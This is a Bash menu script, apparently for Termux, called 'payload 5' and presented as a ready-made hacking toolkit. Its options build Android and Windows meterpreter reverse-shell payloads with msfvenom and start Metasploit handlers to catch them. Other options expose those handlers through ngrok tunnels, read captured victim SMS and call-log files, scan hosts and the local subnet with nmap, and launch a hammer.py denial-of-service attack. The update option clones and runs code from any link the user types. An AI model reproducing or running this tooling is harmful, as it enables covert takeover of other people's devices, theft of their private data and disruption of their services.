

#colors
cyan='\033[1;36m'
green='\033[1;32m'
red='\033[1;31m'
yellow='\033[1;33m'
blue='\033[1;34m'
purple='\033[1;35m'
reset='\033[0m'
n=install







echo -e "$green "

figlet  -f big "                  payload 5  "
echo -e "$blue"
echo '        .e$$$$e.'
sleep 1
echo '      e$$$$$$$$$$e'
sleep 1
echo '     $$$$$$$$$$$$$$'
echo '    d$$$$$$$$$$$$$$b'
echo '    $$$$$$$$$$$$$$$$                    '
echo '   4$$$$$$$$$$$$$$$$F'
sleep 1
echo '   4$$$$$$$$$$$$$$$$F'
echo '    $$$" "$$$$" "$$$          '
echo '    $$F   4$$F   4$$===============||'
sleep 1
echo '     $F   4$$F   4$"               ||       '
echo '     $$   $$$$   $P                ||      '
echo '     $$$$$$""$$$$$                 ||     '
echo '      $$$$F  4$$$$                 || '
sleep 1
echo '       "$$$ee$$$"                  ||'
echo '       .4*$$$$F4                \  ||  /'
echo '        $     .$                 \ || /'
echo '        "$$$$$$"     [0]helpℹ️     \||/   '   
echo '         ^$$$$                     \/       '
echo -e "$bluo p $green a $reset y $purple l $cyan o $yellow a $green d"
echo -e "$red"
echo '                               exit=CTRL+c'
echo -e "$purple"
echo '       ⬇️ msf⬇️ ️        |      ⬇️ nmap⬇️        |     ⬇️ hammer⬇️'
echo '___________________________________________________________'
echo ' [1]payload android📲    [4]check the ip 🔎    [7]dos attack🌎'
echo ' [2]payload windows💻    [5]Download nmap⬇️'
echo ' [3]Download msf⬇️        [6]all Devices🎛'️
echo ''
echo '                            [8]Change the shape of Termux📟'
echo '                            [9]Download nano python fish git️⬇️'
echo ''
echo ' [10]Android penetration msf ☢📲'
echo ' [11]windows penetration msf ☢ ️💻 '
echo ' [12]error metasploit'
echo -e "$red"
echo "                            [13]Download ngrok"
echo "                            [14]open ngrok http "
echo "                            [15]open ngrok tcp "
echo -e "$purple"
echo " [16]open (sms,calllog,....txt) The victim     "


echo ""
echo ""
echo -e "$blue"
echo '                                             [99]update'
echo '                                                  [19]exit'

echo -e "$green"

date
echo ''
read -p "=====>" ali

p(){
echo -e "$blue "
read -p "                  ip=====> " ip
sleep 2
read -p "                      port===>" p
sleep 2
read -p "                        name===>" n

cd
cd metasploit-framework

./msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$p R > /sdcard/$n.apk
echo "   Path of the pyload----->    /sdcard/$n.apk"
echo " end the payload+++++++++++++++++++++ "
sleep 2
cd $HOME/payload5
read -p "                  --------> entar"
./payload.sh
}
#--------------------------------------------------

w(){

echo -e "$purple"
read -p "                  ip=====> " ipp
sleep 2
read -p "                      port===>" pp
sleep 2
read -p "                        name===>" nn

cd
cd metasploit-framework

./msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ipp LPORT=$pp -f exe e > /sdcard/$nn.exe
echo "     Path of the pyload----->   /sdcard/$nn.exe"
echo " end the payload+++++++++++++++++++++ "
sleep 2
cd $HOME/payload5
read -p "                   -------->entar"
./payload.sh
}
#--------------------------------------------------

d(){
cp metasploit.sh $HOME
chmod +x $HOME/metasploit.sh
sh $HOME/metasploit.sh 



}

#--------------------------------------------------

#--------------------------------------------------

nd(){
apt $n  nmap

./payload.sh
}

#--------------------------------------------------


ip(){

read -p "            ip-------->" ip
nmap $ip
sleep 3
read -p "                   ------------>entar"
./payload.sh
}

#--------------------------------------------------
hm(){
read -p "                   ip------>" ip
read -p "                      port---->" pr
read -p "                         time---->" ti
cd hammer
chmod +x hammer.py
python hammer.py -s $ip -p $pr -t $ti


}

#--------------------------------------------------
all(){

nmap -sn 192.168.1.1/24
read -p "                        ---------->entar"
./payload.sh

}


ii(){
echo '             facebook'
echo -e "$green"
echo '        Email:======>  https://www.facebook.com/ali.max.796774'
echo -e "$purple"
echo '                                        /\'
echo '                                        ||'
echo '                                        ||'
echo '                                        ||'
echo '                                        ||'
echo '  To communicate with me  ==============='
read -p "                  ----------> entar"
./payload.sh
}
#--------------------------------------------------
te(){
rm $HOME/.bashrc
cp .bashrc $HOME
pkg install figlet

./payload.sh


}


#--------------------------------------------------
pkp(){

apt $n nano && apt $n python && apt $n python2 && apt $n python3 && apt $n wgit && apt $n git && apt $n fish


./payload.sh
}


aaa(){
echo -e "$cyan"
read -p "                  ip----->" ip
read -p "                    port---->" port
cd msf
echo "use exploit/multi/handler" > .msf.rc
echo "set payload android/meterpreter/reverse_tcp" >> .msf.rc
echo "set lhost $ip" >> .msf.rc
echo "set lport $port" >> .msf.rc
echo "exploit" >> .msf.rc
msfconsole -r .msf.rc


}
#--------------------------------------------------
www(){
echo -e "$red"
read -p "                  ip----->" ip
read -p "                    port---->" port
cd msf
echo "use exploit/multi/handler" > .msf1.rc
echo "set payloads windows/meterpreter/reverse_tcp" >> .msf1.rc
echo "set lhost $ip" >> .msf1.rc
echo "set lport $port" >> .msf1.rc
echo "exploit" >> .msf1.rc
msfconsole -r .msf1.rc


}
#--------------------------------------------------
error(){

echo -e "++++++++++++++++> please wait <++++++++++++++++"
cd msf
chmod +x *
sh error.sh

}
#--------------------------------------------------
up(){
echo "                              (33)== exit"
read -p " Link----------> " up
if [ "$up" -eq "33"  ]; then
pwd
else echo "                    -------> Hi new update <------"
rm -rf $HOME/payload5.zip
rm -rf $HOME/Updat
mkdir $HOME/Updat
mv $HOME/payload5 $HOME/Updat
cd $HOME && git clone $up 
cp $HOME/payload5/payload5.zip $HOME
rm -rf $HOME/payload5
unzip $HOME/payload5.zip
cd $HOME/payload5 && chmod +x *
sh $HOME/payload5/payload.sh




fi

}
#--------------------------------------------------


xxx(){
echo "                         god pay  "


pwd



}


ngrok(){
echo -e "$yellow"
echo "                           open the http://www.ngrok.com"
echo "                   The link starts (./ngrok)"
echo ""
echo "                           [0] back"
read -p "link- - - - > " link
if [ "$link" -eq "0"  ]; then
./payload.sh
else
echo -e "$green"
cp $HOME/payload5/ngrok/ngrok $HOME
cd $HOME && chmod 777 ngrok
$link
echo -e "$yellow"
echo "                                   god pay"

fi
}

#--------------------------------------------------



ngk(){
echo "                                       [0]back"
read -p "         [port]- - - > " port
if [ "$port" -eq "0"  ]; then
./payload.sh
else
cd &&  ./ngrok http $port
fi

}
#--------------------------------------------------



ngkk(){
echo "                                       [0]back"
read -p "         [port]- - - > " port
if [ "$port" -eq "0"  ]; then
./payload.sh
else
cd && ./ngrok tcp $port
fi

}


sms(){
echo -e "$red"
echo "                                 [0]back"
echo -e "$green    "
cd $HOME/payload5/msf && ls
echo ""
read -p "name.txt ------> " n
if [ "$n" -eq "0"  ]; then
cd $HOME/payload5
./payload.sh
else
nano $n
fi
}





#--------------------------------------------------
#--------------------------------------------------
#--------------------------------------------------
if [ "$ali" -eq "1"  ]; then
	p

elif [ "$ali" -eq "2"  ]; then
        w

elif [ "$ali" -eq "3"  ]; then
	d



elif [ "$ali" -eq "4"  ]; then
	ip


elif [ "$ali" -eq "5"  ]; then
        nd

elif [ "$ali" -eq "6"  ]; then
        all

elif [ "$ali" -eq "7"  ]; then
        hm

elif [ "$ali" -eq "8"  ]; then
        te


elif [ "$ali" -eq "0"  ]; then
        ii

elif [ "$ali" -eq "9"  ]; then
	pkp

elif [ "$ali" -eq "10"  ]; then
	aaa

elif [ "$ali" -eq "11"  ]; then
	www
elif [ "$ali" -eq "12"  ]; then
        error

elif [ "$ali" -eq "99"  ]; then
        up
elif [ "$ali" -eq "19"  ]; then
        xxx


elif [ "$ali" -eq "13"  ]; then
        ngrok


elif [ "$ali" -eq "14"  ]; then
        ngk

elif [ "$ali" -eq "15"  ]; then
        ngkk

elif [ "$ali" -eq "16"  ]; then
        sms

#--------------------------------------------------
#--------------------------------------------------
#--------------------------------------------------
else clear
echo -e "$red"
figlet -f big "ERROR"

 ./payload.sh
fi
#--------------------------------------------------
